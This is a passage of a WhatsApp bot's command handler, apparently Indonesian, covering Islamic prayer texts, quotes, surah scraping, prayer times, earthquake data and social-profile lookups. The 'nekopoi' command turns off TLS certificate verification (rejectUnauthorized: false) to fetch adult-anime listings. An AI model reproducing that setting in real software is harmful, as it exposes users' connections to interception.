      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    m.reply(`${contoh} + ${data}`)
}
break

case "quotesislami": case "islam": {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    m.reply(`${arabic}\n${arti}`)
}
break

case 'selectsurah': case "carisurah": case "searchsurah": {
    if (!args[0]) return m.reply(`*Example Command :*\n*.carisurah* 1
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`);
    
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    const cache = new Map();
    const CACHE_DURATION = 3600000; 

    async function selectSurah(link) {
        try {
            const { data } = await axios.get(link, {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            
            const $ = cheerio.load(data);
            const Result = [];
            const Isi = [];
            const surah = $('body > main > article > h1').text().trim() || 'Surah tidak ditemukan';
            const bismillah = $('body > main > article > p').text().trim() || '';
            
            $('body > main > article > ol > li').each((i, e) => {
                const arabic = $(e).find('p.arabic').text().trim() || '';
                const baca = $(e).find('p.translate').text().trim() || '';
                const arti = $(e).find('p.meaning').text().trim() || '';
                
                if (arabic || baca || arti) {
                    Isi.push({ arabic, baca, arti });
                }
            });
            
            if (Isi.length === 0) {
                throw new Error('Tidak dapat menemukan ayat-ayat surah');
            }
            
            Result.push({ surah, bismillah }, Isi);
            return Result;
        } catch (error) {
            throw new Error(`Error mengambil surah: ${error.message}`);
        }
    }

    async function listsurah() {
        try {
            const { data } = await axios.get('https://litequran.net/', {
                timeout: 10000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            
            const $ = cheerio.load(data);
            const Result = [];
            
            $('body > main > ol > li').each((i, e) => {
                const element = $(e).find('a');
                if (element.length) {
                    const name_surah = element.text().trim();
                    const href = element.attr('href');
                    if (name_surah && href) {
                        Result.push({
                            link: 'https://litequran.net/' + href,
                            name_surah
                        });
                    }
                }
            });
            
            if (Result.length === 0) {
                throw new Error('Tidak dapat menemukan daftar surah');
            }
            
            return Result;
        } catch (error) {
            throw new Error(`Error mengambil daftar surah: ${error.message}`);
        }
    }

    async function getSurah(surahIndex) {
        try {
            
            const cacheKey = `surah_${surahIndex}`;
            const cachedData = cache.get(cacheKey);
            if (cachedData && (Date.now() - cachedData.timestamp) < CACHE_DURATION) {
                return cachedData.data;
            }

            const surahList = await listsurah();
            
            if (surahIndex < 1 || surahIndex > 114) {
                return "🚫 *Nomor surah tidak valid.* Silakan masukkan nomor 1-114.";
            }

            if (surahIndex > surahList.length) {
                return "🚫 *Surah tidak ditemukan.* Coba periksa kembali nomor surah.";
            }

            await delay(500);

            const selectedSurah = surahList[surahIndex - 1];
            const surahContent = await selectSurah(selectedSurah.link);

            let response = `🕌 *${surahContent[0].surah}*\n\n`;
            if (surahContent[0].bismillah) {
                response += `${surahContent[0].bismillah}\n\n`;
            }
            response += `📜 *Ayat-ayat suci Al-Quran:*\n\n`;

            surahContent[1].forEach((ayah, index) => {
                response += `*𖦹 Ayat ${index + 1}:*\n`;
                if (ayah.arabic) response += `🕋 ${ayah.arabic}\n`;
                if (ayah.baca) response += `📖 ${ayah.baca}\n`;
                if (ayah.arti) response += `📚 ${ayah.arti}\n\n`;
            });

            response += `\n🤲 *Semoga Allah memberikan pemahaman dari ayat-ayat ini.*`;

            
            cache.set(cacheKey, {
                data: response,
                timestamp: Date.now()
            });

            return response;
        } catch (error) {
            return `🚫 *Error:* ${error.message}`;
        }
    }

    try {
        const surahIndex = parseInt(args[0]);
        if (isNaN(surahIndex)) {
            return m.reply("🚫 *Masukkan nomor surah yang valid (1-114).*");
        }
        
        m.reply("⏳ *Sedang mengambil surah...*");
        const response = await getSurah(surahIndex);
        m.reply(response);
    } catch (error) {
        m.reply(`🚫 *Terjadi kesalahan:* ${error.message}`);
    }
    }
    break

case 'doa': {
  try {
    let jir = await fetchJson('https://doa-doa-api-ahmadramadhan.fly.dev/api')
    let daftarDoa = jir

    if (!text) {
      let listDoa = '*DAFTAR DOA*\n\n' + daftarDoa.map((item) => `- ${item.doa}`).join('\n')
      listDoa += '\n*Example Command :*\n*.doa* nama doa'
      m.reply(listDoa)
    } else {
      let hasil = daftarDoa.find((item) => item.doa.toLowerCase().includes(text.toLowerCase()))
      
      if (hasil) {
        let tks = `*${hasil.doa.toUpperCase()}*\n\n` +
                  `Ayat: ${hasil.ayat}\n` +
                  `Latin: ${hasil.latin}\n` +
                  `Artinya: ${hasil.artinya}`
        m.reply(tks)
      } else {
        m.reply('Doa yang lu cari ga ketemu cuy. Cek lagi nama doanya!')
      }
    }
  } catch (err) {
    console.error(err)
    m.reply('Error cuy, coba lagi ntar!')
  }
}
break  

case 'pantunislam': {
  async function AI(content) {
      try {
          const response = await axios.post('https://luminai.my.id/', { content, cName: "S-AI", cID: "S-AIbAQ0HcC" });

          return response.data
      } catch (error) {
          console.error(error)
          throw error
      }
  }
      let qe = 'Berikan satu kata-kata pantun Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
      let qo = await AI(qe)
      m.reply(qo.result)
}
break

case 'asmaulhusna': {
  try {
    let jir = await fetchJson('https://islamic-api-zhirrr.vercel.app/api/asmaulhusna')
    let ye = jir.data

    let tks = '*ASMAUL HUSNA*\n\n' + ye.map((item) => {
      return `Urutan: ${item.index}\nLatin: ${item.latin}\nArab: ${item.arabic}\nTerjemahan ID: ${item.translation_id}\nTerjemahan EN: ${item.translation_en}\n`
    }).join('\n')

    m.reply(tks)
  } catch (err) {
    console.error(err)
    m.reply('Error cuy, coba lagi ntar!')
  }
}
break

case 'gislam': {
  if (!text) return m.reply('*Example Comand :*\n*.gislam* tentang nabi adam')
  async function islam(query) {
      try {
          const response = await fetchJson(`https://artikel-islam.netlify.app/.netlify/functions/api/ms?page=1&s=${encodeURIComponent(query)}`)
          if (response.success) {
              const articles = response.data.data
              let message = `Total artikel: ${articles.length}\n\n`
              articles.forEach((article, index) => {
                  message += `${index + 1}. Judul: ${article.title}\nURL: ${article.url}\n\n`
              })
              return message
          } else {
              return 'Gagal mengambil data'
          }
      } catch (error) {
          return 'Terjadi kesalahan saat mengambil data'
      }
  }
              let lp = await islam(text)
              m.reply(lp)
}
break

case 'kataislam': {
  async function AI(content) {
      try {
          const response = await axios.post('https://luminai.my.id/', { content, cName: "S-AI", cID: "S-AIbAQ0HcC" });

          return response.data
      } catch (error) {
          console.error(error)
          throw error
      }
  }
      let qe = 'Berikan satu kata-kata atau quotes Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
      let qo = await AI(qe)
      m.reply(qo.result)
}
break

case 'jadwalsholat': {
  if (!text) return m.reply('*Example Command :*\n*.jadwalsholat* kota')
    try {
        let jir = await fetchJson(`https://api.agatz.xyz/api/jadwalsholat?kota=${encodeURIComponent(text)}`)
        let ye = jir.data
        let tks = `\n*JADWAL SHOLAT ${text.toUpperCase()}*
        Shubuh: ${ye.subuh}
        Dzuhur: ${ye.dhuhur}
        Ashar: ${ye.ashar}
        Maghrib: ${ye.maghrib}
        Isya: ${ye.isya}\n`
        m.reply(tks)
    } catch (err) {
        console.error(err)
        m.reply(err)
    }
}
break
 
case "niatsholat": case "niatshalat": {
    if (!q) return m.reply(`*Example Command :*\n*.niatsholat* subuh\n\n List :\n- subuh\n- maghrib\n- dzuhur\n- isha\n- ashar`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return m.reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n⳺ Subuh\n⳺ Maghrib\n⳺ Dzuhur\n⳺ Isha\n⳺ Ashar`)
    m.reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}
break

case 'cekjadwal': {
    if (!args[0]) return m.reply("❌ *Masukkan nama kota!*\n\n📌 *Contoh:* `.cekjadwal Jakarta`");

    let daftarKota = await getListKota();
    if (!daftarKota) return m.reply("❌ *Gagal mengambil daftar kota!*");

    let kota = daftarKota.find(k => k.lokasi.toLowerCase().includes(args.join(" ").toLowerCase()));
    if (!kota) return m.reply("❌ *Kota tidak ditemukan!* Cek daftar kota dengan `.listkota`");

    let jadwal = await getJadwalSholat(kota.id);
    if (!jadwal) return m.reply("❌ *Gagal mengambil jadwal sholat untuk kota ini!*");

    let pesan = `📅 *Jadwal Sholat untuk ${jadwal.lokasi}, ${jadwal.daerah}*\n`;
    pesan += `🕌 *Subuh:* \`${jadwal.subuh}\`\n`;
    pesan += `☀️ *Dzuhur:* \`${jadwal.dzuhur}\`\n`;
    pesan += `🌤️ *Ashar:* \`${jadwal.ashar}\`\n`;
    pesan += `🌆 *Maghrib:* \`${jadwal.maghrib}\`\n`;
    pesan += `🌌 *Isya:* \`${jadwal.isya}\`\n`;

    m.reply(pesan);
}
break;    

case 'setpuasa': {
    if (!m.isGroup) return Reply(mess.group);
    if (!m.isAdmin) return m.reply("❌ *Hanya admin yang bisa mengubah pengaturan ini!*");
    if (!["on", "off"].includes(args[0])) return m.reply("📌 *Gunakan:*\n- `.setpuasa on` ➝ Aktifkan mode puasa\n- `.setpuasa off` ➝ Nonaktifkan mode puasa");

    try {
        let config = loadConfig();  // Pastikan loadConfig() sudah dideklarasikan
        if (!config[m.chat]) ensureGroupConfig(m.chat);

        if (!config[m.chat].jadwalPuasa) config[m.chat].jadwalPuasa = {};  // Pastikan objek ini ada
        
        let status = args[0] === "on";
        config[m.chat].jadwalPuasa.aktif = status;
        saveConfig(config);

        m.reply(`✅ *Mode puasa telah ${status ? "diaktifkan" : "dimatikan"}!*`);
    } catch (error) {
        console.error(error);
        m.reply("❌ Terjadi kesalahan dalam mengubah mode puasa.");
    }
}
break;

case 'matikanjadwal':
case 'matikanpuasa': {
if (!m.isGroup) return Reply(mess.group)
    if (!m.isAdmin) return m.reply("❌ Hanya admin yang bisa mematikan fitur ini!");

    let config = loadConfig();
    if (!config[m.chat]) ensureGroupConfig(m.chat);

    let fitur = command === 'matikanjadwal' ? 'jadwalSholat' : 'jadwalPuasa';
    if (!config[m.chat][fitur]?.aktif) return reply(`❌ ${command === 'matikanjadwal' ? "Jadwal sholat" : "Jadwal puasa"} sudah nonaktif!`);

    config[m.chat][fitur].aktif = false;
    saveConfig(config);

    return m.reply(`✅ ${command === 'matikanjadwal' ? "Jadwal sholat" : "Jadwal puasa"} telah dimatikan untuk grup ini!`);
}
break;    

case 'sholat': {
    let pesan = `🕌 *Pengaturan Jadwal Sholat*  
Gunakan perintah ini:  
- \`.setjadwal [nama kota]\` ➝ Aktifkan pengingat sholat  
  🔹 *Contoh:* \`.setjadwal Bogor\`  
- \`.matikanjadwal\` ➝ Matikan pengingat sholat  
- \`.listkota\` ➝ Lihat daftar kota yang tersedia  
- \`.cekjadwal\` ➝ Lihat Jadwal Sholat Di Kota yang tersedia

⚡ *Format Notifikasi Sholat:*  
📢 *Saat Waktu Sholat Tiba:*  
🌆 *Maghrib Telah Tiba*  
Pergi dan ambil air wudhu lalu sholatlah🕌  
📍 *Lokasi:* KAB. BOGOR, JAWA BARAT  

🌙 *Pengaturan Pengingat Puasa*  
Gunakan perintah ini:  
- \`.setpuasa [nama kota]\` ➝ Aktifkan pengingat sahur & buka puasa  
  🔹 *Contoh:* \`.setpuasa Jakarta\`  
- \`.matikanpuasa\` ➝ Matikan pengingat puasa  

⚡ *Format Notifikasi Puasa:*  
📢 *Saat Sahur & Buka Puasa:*  
🌙 *Selamat Sahur! Jangan lupa niat ya!*  
📍 *Lokasi:* KOTA JAKARTA  

🌆 *Selamat Buka Puasa!* Semoga berkah!  
📍 *Lokasi:* KOTA JAKARTA  

🔒 *Tutup Grup Otomatis Saat Maghrib*  
- Grup akan *tertutup selama 10 menit* saat waktu Maghrib tiba  
- Setelah 10 menit, grup akan terbuka kembali secara otomatis  

📌 *Semua waktu dihitung berdasarkan kota yang telah diset!*  
📢 *Gunakan* \`.sholat\` *untuk melihat panduan ini kapan saja!*`;

return m.reply(pesan);
}
break;

case "kisahnabi": {
if (!text) return m.reply(`*Example Command :*\n*.kisahnabi* adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return m.reply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*—————— \`[ K I S A H ]\` ——————*

${kisah.description}`

m.reply(`${hasil}`)

}
break

case "asupan": case "cosplay": {
  m.reply(mess.wait);
  let anu = `https://archive-ui.tanakadomp.biz.id/asupan/cosplay`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' });
  try {
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Sukses'
    }, {quoted: m})
  } catch (e) {
     console.log(e)
}
}
break

case "neko": case "nekopoi": {
  try {
    const fetch = require('node-fetch');
    const https = require('https');
    
    const agent = new https.Agent({
      rejectUnauthorized: false 
    });

    let anu = `https://archive-ui.tanakadomp.biz.id/asupan/nekopoi`;
    const res = await fetch(anu, { agent });
    const data = await res.json();
    
    if (!data.status) return m.reply("Gagal mendapatkan data!");
    
    let hasil = `*Hasil Pencarian*\n\n`;
    const maxResults = Math.min(15, data.result.length);
    
    for (let i = 0; i < maxResults; i++) {
      hasil += `📍 *Title:* ${data.result[i].title}\n`;
      hasil += `📅 *Upload:* ${data.result[i].upload}\n`;
      hasil += `🔗 *URL:* ${data.result[i].URL}\n\n`;
      hasil += `───────────────────\n\n`;
    }
    
    m.reply(hasil);
  } catch (e) {
    console.error('Error:', e);
    m.reply("Terjadi kesalahan saat mengambil data! " + e.message);
  }
}
break

case "buatgambar": case "flux": case "fluximg": case "createimage": case "bikin gambar": case "timg": {
  if (!text) {
    return m.reply('*Example Command :*\n*.creategambar* nama gambar');
  }
  try {
    m.reply('Loading...');
    let apiUrl = `https://api.rynn-archive.biz.id/ai/flux-schnell?text=${encodeURIComponent(text)}`;
    let response = await fetch(apiUrl);
    let buffer = await response.buffer();
    await conn.sendMessage(m.chat, { image: buffer, caption: 'Berhasil membuat gambar' }, { quoted: m });
  } catch (error) {
    console.error('Error in flux:', error);
    m.reply('Terjadi kesalahan saat memproses gambar');
  }
}
break

case "cekgempa": {
    m.reply("Memproses pencarian");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return m.reply("Gagal mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await conn.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            conn.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        m.reply("Terjadi kesalahan saat mengambil data gempa.");
    }
}
break

case "tiktokstalk": case "ttstalk": {
    if (!text) return m.reply(`*Example Command :*\n*.tiktokstalk* username`);
    try {
        let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/tools/tiktokstalk?user=${text}`);
        let data = await api.json();
        if (!data.status) return m.reply('User not found!');
        let caption = `乂 *TIKTOK STALK*

◦ *Name* : ${data.result.nama}
◦ *Username* : ${data.result.user}
◦ *Bio* : ${data.result.bio}
◦ *Followers* : ${data.result.followers}
◦ *Following* : ${data.result.following}
◦ *Private* : ${data.result.privatemode ? 'Yes' : 'No'}`;
        await conn.sendMessage(m.chat, { 
            image: { url: data.result.profile },
            caption: caption 
        });
    } catch (e) {
        console.log(e);
        m.reply('Error occurred while fetching data!');
    }
}
break   

case "youtubestalk": {
  if (!text) return m.reply(`*Example Commad :*\n*.youtubestalk* username`);
  try {
    let api = await fetch(`https://api.siputzx.my.id/api/stalk/youtube?username=${text}`);
    let data = await api.json();
    if (!data.status) return m.reply('Search failed! Try again later.');
    if (!data.data) return m.reply('No results found! Try searching on a search engine for more information.');
    
    let caption = `乂 *YOUTUBE STALK* ◦\n\n`;
    caption += `乂 *Username* : ${data.data.channel.username}\n`;
    caption += `乂 *Subscriber Count* : ${data.data.channel.subscriberCount}\n`;
    caption += `乂 *Video Count* : ${data.data.channel.videoCount}\n`;
    caption += `乂 *Avatar Url* : ${data.data.channel.avatarUrl}\n`;
    caption += `乂 *Channel Url* : ${data.data.channel.channelUrl}\n`;
    caption += `乂 *Description* : ${data.data.channel.description}\n\n`;
    
    await conn.sendMessage(m.chat, { image: { url: data.data.channel.avatarUrl }, caption: caption });
    
    let latestVideos = data.data.latest_videos;
    for (let i = 0; i < latestVideos.length; i++) {
      let video = latestVideos[i];
      let videoCaption = `乂 *VIDEO ${i + 1}* ◦\n\n`;
      videoCaption += `乂 *Title* : ${video.title}\n`;
      videoCaption += `乂 *Video ID* : ${video.videoId}\n`;
